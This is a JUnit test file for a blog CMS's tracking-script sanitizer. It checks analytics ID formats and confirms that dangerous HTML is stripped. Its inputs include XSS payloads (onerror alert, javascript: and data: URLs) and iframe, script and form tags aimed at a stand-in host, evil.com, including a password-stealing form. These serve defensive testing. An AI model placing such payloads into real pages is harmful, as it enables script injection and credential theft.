package com.blog.cms.content;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * TDD RED phase — tests for the strict allowlist sanitizer.
 *
 * Policy: Only the following HTML tags are allowed in custom head/body scripts:
 *   - <script> (only with non-remote src OR src on Google/Facebook/TikTok/Microsoft allowlist)
 *   - <style>
 *   - <noscript>
 *   - <meta>
 *   - <link>
 *
 * Disallowed tags (will be stripped):
 *   - <iframe>, <object>, <embed>, <form>, <input>, <button>
 *   - <script src="evil.com"> where domain not on allowlist
 *   - Event handlers (onclick, onerror, onload, etc.)
 *
 * Disallowed URL schemes:
 *   - javascript:, data:, vbscript:
 */
@DisplayName("TrackingScriptSanitizer — strict allowlist policy")
class TrackingScriptSanitizerTest {

    private final TrackingScriptSanitizer sanitizer = new TrackingScriptSanitizer();

    @Nested
    @DisplayName("Valid tracking IDs — sanitize by stripping script body but keeping ID")
    class ValidIds {

        @Test
        @DisplayName("GA4 ID with default template is preserved")
        void ga4Id_valid_kept() {
            String input = "G-ABC123DEF4";
            assertTrue(sanitizer.isValidGa4Id(input));
        }

        @Test
        @DisplayName("GA4 ID too short is rejected")
        void ga4Id_tooShort_rejected() {
            assertFalse(sanitizer.isValidGa4Id("G-AB"));
        }

        @Test
        @DisplayName("GA4 ID without G- prefix is rejected")
        void ga4Id_wrongPrefix_rejected() {
            assertFalse(sanitizer.isValidGa4Id("ABC123DEF4"));
        }

        @Test
        @DisplayName("GTM Container ID with GTM- prefix is valid")
        void gtmId_valid_kept() {
            assertTrue(sanitizer.isValidGtmId("GTM-ABC123"));
        }

        @Test
        @DisplayName("GTM Container ID without GTM- prefix is rejected")
        void gtmId_wrongPrefix_rejected() {
            assertFalse(sanitizer.isValidGtmId("ABC123"));
        }

        @Test
        @DisplayName("Facebook Pixel ID 15-20 digits is valid")
        void fbPixelId_valid_kept() {
            assertTrue(sanitizer.isValidFbPixelId("123456789012345"));
            assertTrue(sanitizer.isValidFbPixelId("12345678901234567890"));
        }

        @Test
        @DisplayName("Facebook Pixel ID with non-digits is rejected")
        void fbPixelId_nonDigits_rejected() {
            assertFalse(sanitizer.isValidFbPixelId("12345abc6789012"));
        }

        @Test
        @DisplayName("Facebook Pixel ID too short is rejected")
        void fbPixelId_tooShort_rejected() {
            assertFalse(sanitizer.isValidFbPixelId("12345"));
        }

        @Test
        @DisplayName("TikTok Pixel ID with C prefix is valid")
        void tiktokPixelId_valid_kept() {
            assertTrue(sanitizer.isValidTiktokPixelId("C12345ABCDE6789"));
        }

        @Test
        @DisplayName("TikTok Pixel ID without C prefix is rejected")
        void tiktokPixelId_wrongPrefix_rejected() {
            assertFalse(sanitizer.isValidTiktokPixelId("12345ABCDE6789"));
        }
    }

    @Nested
    @DisplayName("Sanitize raw HTML — allowed tags pass through")
    class AllowedTags {

        @Test
        @DisplayName("<style> tag is preserved")
        void styleTag_preserved() {
            String input = "<style>body { color: red; }</style>";
            String result = sanitizer.sanitizeHead(input);
            assertTrue(result.contains("<style>"));
            assertTrue(result.contains("body { color: red; }"));
        }

        @Test
        @DisplayName("<meta> tag is preserved")
        void metaTag_preserved() {
            String input = "<meta name=\"robots\" content=\"noindex\">";
            String result = sanitizer.sanitizeHead(input);
            assertTrue(result.contains("<meta"));
        }

        @Test
        @DisplayName("<link rel='canonical'> tag is preserved")
        void linkTag_preserved() {
            String input = "<link rel=\"canonical\" href=\"https://example.com/page\">";
            String result = sanitizer.sanitizeHead(input);
            assertTrue(result.contains("<link"));
        }

        @Test
        @DisplayName("<script> with Google src is preserved (allowlist)")
        void googleScript_preserved() {
            String input = "<script async src=\"https://www.googletagmanager.com/gtag/js?id=G-ABC\"></script>";
            String result = sanitizer.sanitizeHead(input);
            assertTrue(result.contains("googletagmanager.com"));
        }

        @Test
        @DisplayName("<script> with Facebook src is preserved")
        void facebookScript_preserved() {
            String input = "<script src=\"https://connect.facebook.net/en_US/fbevents.js\"></script>";
            String result = sanitizer.sanitizeHead(input);
            assertTrue(result.contains("fbevents.js"));
        }
    }

    @Nested
    @DisplayName("Sanitize raw HTML — dangerous tags/attrs are stripped")
    class DisallowedTags {

        @Test
        @DisplayName("<iframe> is stripped entirely")
        void iframe_stripped() {
            String input = "<iframe src=\"https://evil.com/x\"></iframe>";
            String result = sanitizer.sanitizeHead(input);
            assertFalse(result.contains("<iframe"));
            assertFalse(result.contains("evil.com"));
        }

        @Test
        @DisplayName("<object> is stripped")
        void object_stripped() {
            String input = "<object data=\"https://evil.com/x.swf\"></object>";
            String result = sanitizer.sanitizeHead(input);
            assertFalse(result.contains("<object"));
        }

        @Test
        @DisplayName("<embed> is stripped")
        void embed_stripped() {
            String input = "<embed src=\"https://evil.com/x.swf\">";
            String result = sanitizer.sanitizeHead(input);
            assertFalse(result.contains("<embed"));
        }

        @Test
        @DisplayName("<form> is stripped")
        void form_stripped() {
            String input = "<form action=\"https://evil.com/steal\"><input name=\"password\"></form>";
            String result = sanitizer.sanitizeHead(input);
            assertFalse(result.contains("<form"));
            assertFalse(result.contains("password"));
        }

        @Test
        @DisplayName("<script> with non-allowlisted src is stripped")
        void evilScript_stripped() {
            String input = "<script src=\"https://evil.com/x.js\"></script>";
            String result = sanitizer.sanitizeHead(input);
            assertFalse(result.contains("evil.com"));
        }

        @Test
        @DisplayName("Inline event handlers (onerror) are stripped")
        void onerror_stripped() {
            String input = "<img src=\"x\" onerror=\"alert('xss')\">";
            String result = sanitizer.sanitizeHead(input);
            assertFalse(result.contains("onerror"));
            assertFalse(result.contains("alert"));
        }

        @Test
        @DisplayName("javascript: URL scheme is stripped")
        void javascriptScheme_stripped() {
            String input = "<a href=\"javascript:alert('xss')\">click</a>";
            String result = sanitizer.sanitizeHead(input);
            assertFalse(result.contains("javascript:"));
        }

        @Test
        @DisplayName("data: URL scheme is stripped")
        void dataScheme_stripped() {
            String input = "<a href=\"data:text/html,<script>alert(1)</script>\">click</a>";
            String result = sanitizer.sanitizeHead(input);
            assertFalse(result.contains("data:text/html"));
        }
    }

    @Nested
    @DisplayName("Edge cases — null/empty/large input")
    class EdgeCases {

        @Test
        @DisplayName("null input returns empty string")
        void nullInput_returnsEmpty() {
            assertEquals("", sanitizer.sanitizeHead(null));
        }

        @Test
        @DisplayName("empty string returns empty string")
        void emptyInput_returnsEmpty() {
            assertEquals("", sanitizer.sanitizeHead(""));
        }

        @Test
        @DisplayName("input with only whitespace returns empty after trim")
        void whitespaceInput_returnsEmpty() {
            assertEquals("", sanitizer.sanitizeHead("   \n\t   "));
        }

        @Test
        @DisplayName("input with mixed allowed/disallowed tags strips only the disallowed")
        void mixedTags_partialStrip() {
            String input = "<style>body{color:red}</style><iframe src='evil.com'></iframe>";
            String result = sanitizer.sanitizeHead(input);
            assertTrue(result.contains("<style>"));
            assertFalse(result.contains("<iframe"));
        }
    }
}
